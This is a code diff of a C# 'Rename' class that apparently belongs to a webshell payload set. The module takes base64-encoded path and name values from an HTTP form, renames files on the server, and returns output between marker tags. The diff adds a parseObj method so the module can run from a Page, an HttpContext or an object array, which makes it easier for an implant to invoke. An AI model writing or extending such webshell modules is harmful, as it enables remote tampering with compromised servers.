@@ -16,9 +16,7 @@ public class Rename
 
     public override bool Equals(object obj)
     {
-        Page page = (Page) obj;
-        this.Response = page.Response;
-        this.Request = page.Request;
+        this.parseObj(obj);
         this.cs = "UTF-8";
         this.encoder = "base64";
         this.decoder = "";
@@ -31,7 +29,7 @@ public class Rename
         {
             String path = decode(this.Request.Form["path"]);
             String name = decode(this.Request.Form["name"]);
-            result += this.RenameCode(path,name);
+            result += this.RenameCode(path, name);
         }
         catch (Exception e)
         {
@@ -40,6 +38,31 @@ public class Rename
 
         this.Response.Write(tag_s + asoutput(result) + tag_e);
         return true;
+    }
+
+    public void parseObj(Object obj)
+    {
+        if (obj.GetType().IsArray)
+        {
+            Object[] data = (Object[])obj;
+            this.Request = (HttpRequest)data[0];
+            this.Response = (HttpResponse)data[1];
+        }
+        else
+        {
+            try
+            {
+                Page page = (Page)obj;
+                this.Response = page.Response;
+                this.Request = page.Request;
+            }
+            catch (Exception)
+            {
+                HttpContext context = (HttpContext)obj;
+                this.Response = context.Response;
+                this.Request = context.Request;
+            }
+        }
     }
 
     public String RenameCode(String oldName, String newName)
